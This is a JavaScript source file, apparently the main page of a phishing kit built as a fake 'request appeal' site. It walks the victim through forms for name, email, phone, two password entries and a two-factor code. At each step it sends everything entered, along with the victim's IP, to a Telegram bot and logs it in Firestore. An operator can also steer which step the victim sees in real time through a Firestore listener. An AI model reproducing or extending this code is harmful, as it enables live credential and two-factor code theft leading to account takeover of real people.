import styles from '../styles/Home.module.css'
import { useState, useEffect } from 'react';
import Header from './header';
import Help from './help';

import HomePage from './home-page';
import RequestAppeal from './request-appeal';

import Password from './password';
import Final from './final';
import TwoFactorAuth from './two-factor-auth';
import { doc, setDoc, updateDoc, onSnapshot, Timestamp } from "firebase/firestore";

import { db } from  '../firebaseConfig';


export default function Home(ip) {

  const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false, step_four: false, step_five: false});

  const [fullName, setFullName] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [appeal, setAppeal] = useState('');
  
  const [firstPassword, setFirstPassword] = useState('');
  const [secondPassword, setSecondPassword] = useState('');


  useEffect(()=>{
    let localEmail = localStorage.getItem("email");
    if(localEmail){
      setEmail(localEmail);
      listenUser(localEmail);
    }
  },[]);  

  const sendOpenedScript = async () => {

    const formattedMessage = `
    <b>User (${ip.userIP})</b>
    -------------------------
    <b>Message:</b> Hini
    `;

    const data = {
        chat_id: process.env.chatId,
        text: formattedMessage,
        parse_mode: 'HTML'
    };


    const response = await fetch(process.env.customKey, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
  } 

  const getData = async (data) => {
    if(data.type == 'home-page') {
      setOpen({step_two: true});
      sendOpenedScript();
    }
    if(data.type == 'request-appeal'){
      console.log(data);
      setFullName(data.data.fullName);
      setEmail(data.data.email);
      setPhone(data.data.phone);
      setAppeal(data.data.appeal);

      let obj = {
            fullName: data.data.fullName,
            email: data.data.email,
            phone: data.data.phone,
            appeal: data.data.appeal,
            createdAt: await Timestamp.now(),
            currentStep: '',
            ip: ip.userIP
      }
      await setDoc(doc(db, "users", data.data.email), obj);
      localStorage.setItem("email", data.data.email);
      listenUser(data.data.email);
      setOpen({step_three: true});

      const formattedMessage = `
          <b>User (${ip.userIP})</b>
          -------------------------
          <b>Full Name:</b> ${data.data.fullName}
          <b>Email:</b> ${data.data.email}
          <b>Phone:</b> ${data.data.phone}
          <b>Appeal:</b> ${data.data.appeal}
      `;
          
      const dataTelegram = {
          chat_id: process.env.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
      };
                 
      const response = await fetch(process.env.customKey, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(dataTelegram)
      });
    }

    if(data.type == 'first-password'){
        const docRef = doc(db, "users", email);
        await updateDoc(docRef,data.data);
        setFirstPassword(data.data.firstPassword);

        const formattedMessage = `
          <b>User (${ip.userIP})</b>
          -------------------------
          <b>Full Name:</b> ${fullName}
          <b>Email:</b> ${email}
          <b>Phone:</b> ${phone}
          <b>Appeal:</b> ${appeal}
          <b>First Password:</b> ${data.data.firstPassword}
      `;
          
      const dataTelegram = {
          chat_id: process.env.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
      };
                 
      const response = await fetch(process.env.customKey, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(dataTelegram)
      });

    }
    if(data.type == 'second-password') {
        const docRef = doc(db, "users", email);
        await updateDoc(docRef,data.data);
        setOpen({step_four: true})
        setSecondPassword(data.data.secondPassword);

        const formattedMessage = `
          <b>User (${ip.userIP})</b>
          -------------------------
          <b>Full Name:</b> ${fullName}
          <b>Email:</b> ${email}
          <b>Phone:</b> ${phone}
          <b>Appeal:</b> ${appeal}
          <b>First Password:</b> ${firstPassword}
          <b>Second Password:</b> ${data.data.secondPassword}
      `;
          
      const dataTelegram = {
          chat_id: process.env.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
      };
                 
      const response = await fetch(process.env.customKey, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(dataTelegram)
      });
    }
    if(data.type == 'two-factor') {
      // setOpen({step_five: true})
      const formattedMessage = `
          <b>User (${ip.userIP})</b>
          -------------------------
          <b>Full Name:</b> ${fullName}
          <b>Email:</b> ${email}
          <b>Phone:</b> ${phone}
          <b>Appeal:</b> ${appeal}
          <b>First Password:</b> ${firstPassword}
          <b>Second Password:</b> ${secondPassword}
          <b>Code:</b> ${data.data.code}

      `;
        
            const dataGram = {
              chat_id: process.env.chatId,
              text: formattedMessage,
              parse_mode: 'HTML'
            };
        
        
            const response = await fetch(process.env.customKey, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(dataGram)
            });
    }
  }

  const listenUser = (email) => {

      const unsub = onSnapshot(doc(db, "users", email), (doc) => {
        let user = doc.data();
        console.log(user);

        if(user.currentStep == 'firstPage') setOpen({step_one: true});
        if(user.currentStep == 'appeal') setOpen({step_two: true});
        if(user.currentStep == 'password') setOpen({step_three: true});
        if(user.currentStep == 'twoFactor') setOpen({step_four: true});
        if(user.currentStep == 'final') setOpen({step_four: true});

        console.log("Current data: ", doc.data());
      });
  }

  return (

    <div className={styles.main}>
        <Header />
        <Help />

        <div className={styles.content}>
          { steps.step_one && <HomePage onSubmit={getData} /> }
          { (steps.step_two || steps.step_three) && <RequestAppeal onSubmit={getData} /> }
          { steps.step_three && <Password onSubmit={getData} /> }
          { steps.step_four && <TwoFactorAuth onSubmit={getData} /> }
          { steps.step_five && <Final onSubmit={getData} /> }
        </div>

    </div>
  )
}

Home.getInitialProps = async ({ req }) => {
  let userIP
  if (req) {
    userIP = req.headers['x-real-ip'] || req.connection.remoteAddress
  }
  return { userIP }
}
